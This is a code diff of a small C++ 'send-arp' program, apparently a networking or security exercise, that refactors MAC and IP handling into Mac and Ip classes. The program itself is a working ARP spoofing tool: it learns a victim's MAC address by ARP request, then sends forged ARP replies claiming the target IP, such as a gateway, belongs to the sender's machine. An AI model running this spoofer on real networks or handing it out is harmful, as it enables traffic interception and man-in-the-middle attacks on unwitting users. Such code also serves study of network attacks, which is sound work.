@@ -14,8 +14,8 @@
 #include <netinet/in.h>
 #include <arpa/inet.h>
 
-#define MAC_ALEN 6
-
+//typedef uint8_t mac[6];
+//typedef uint32_t ip;
 #pragma pack(push, 1)
 struct EthArpPacket {
     EthHdr eth_;
@@ -28,15 +28,14 @@ void usage() {
     printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1");
 }
 
-void getmac(char *dev, uint8_t *mac){
+void getmac(char *dev, Mac *mac){
     struct ifreq ifr;
     int sockfd, ret;
     sockfd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);
     strcpy(ifr.ifr_name,dev);
     ret = ioctl(sockfd, SIOCGIFHWADDR, &ifr);
     if(ret == 0){
-        for(int i=0; i<=5; i++)
-            mac[i] = ifr.ifr_hwaddr.sa_data[i];
+        memcpy(mac,ifr.ifr_hwaddr.sa_data,Mac::SIZE);
     }else{
         printf("Fail ioctl \n");
         exit (1);
@@ -49,11 +48,9 @@ int main(int argc, char* argv[]) {
         return -1;
     }
     char* dev = argv[1];
-    char *sen_IP =argv[2];
-    char *tar_IP = argv[3];
-
-
-    uint8_t mac[MAC_ALEN];
+    Ip sen_IP =std::string(argv[2]);
+    Ip tar_IP = std::string(argv[3]);
+    Mac mac;
     char errbuf[PCAP_ERRBUF_SIZE];
     pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
     if (handle == nullptr) {
@@ -61,11 +58,10 @@ int main(int argc, char* argv[]) {
         return -1;
     }
     //getmymac;
-    getmac(dev,mac);
+    getmac(dev , &mac);
     //getmyip
     char *my_ip;
     struct ifreq ifr;
-
     int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
     /* I want to get an IPv4 IP address */
     ifr.ifr_addr.sa_family = AF_INET;
@@ -78,29 +74,28 @@ int main(int argc, char* argv[]) {
     }
     my_ip = inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr);
     //printf("%s\n",my_ip);
-
     EthArpPacket packet;
     //broadcast
-    memcpy(packet.eth_.smac_, mac , MAC_ALEN);
-    memset(packet.eth_.dmac_,0xFF, MAC_ALEN);
+    packet.eth_.smac_ = mac;
+    //memcpy(packet.eth_.smac_, mac , MAC_ALEN);
+    memset(packet.eth_.dmac_,0xFF, Mac::SIZE);
     packet.eth_.type_ = htons(EthHdr::Arp);
     packet.arp_.hrd_ = htons(ArpHdr::ETHER);
     packet.arp_.pro_ = htons(EthHdr::Ip4);
     packet.arp_.hln_ = Mac::SIZE;
     packet.arp_.pln_ = Ip::SIZE;
     packet.arp_.op_ = htons(ArpHdr::Request);
-    memcpy(packet.arp_.smac_, mac, MAC_ALEN);
+    packet.arp_.smac_ = mac;
+    //memcpy(packet.arp_.smac_, mac, MAC_ALEN);
     packet.arp_.sip_ = htonl(Ip(my_ip));
-    memset(packet.arp_.tmac_,0x00, MAC_ALEN);
+    memset(packet.arp_.tmac_,0x00, Mac::SIZE);
     packet.arp_.tip_= htonl(Ip(sen_IP));
 
     //sendpacket
     int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
     if (res != 0) {
         fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
-
     }
-
     //reply
     while(true){
         struct pcap_pkthdr* header;
@@ -115,16 +110,21 @@ int main(int argc, char* argv[]) {
         struct EthArpPacket *rpacket = (struct EthArpPacket *)repacket;
         if(ntohs(rpacket->eth_.type_) != EthHdr::Arp) continue;
         if(packet.arp_.sip_ == rpacket->arp_.tip_ && packet.arp_.tip_ == rpacket->arp_.sip_){
-            memcpy(packet.eth_.dmac_, rpacket->arp_.smac_ ,MAC_ALEN);
-            memcpy(packet.arp_.tmac_, rpacket->arp_.smac_ ,MAC_ALEN);
+            packet.eth_.dmac_ = rpacket->arp_.smac_;
+            packet.arp_.tmac_ = rpacket->arp_.smac_;
+            packet.eth_.dmac_ = rpacket->arp_.smac_;
+            packet.arp_.tmac_ = rpacket->arp_.smac_;
+            //memcpy(packet.eth_.dmac_, rpacket->arp_.smac_ ,MAC_ALEN);
+            //memcpy(packet.arp_.tmac_, rpacket->arp_.smac_ ,MAC_ALEN);
             packet.arp_.op_=htons(ArpHdr::Reply);
             packet.arp_.sip_ = htonl(Ip(tar_IP));
-        }
 
-        int reply = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
-        if (reply != 0) {
-            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", reply, pcap_geterr(handle));
+            int reply = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
+            if (reply != 0) {
+                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", reply, pcap_geterr(handle));
 
+                break;
+            }
         }
     }
     pcap_close(handle);
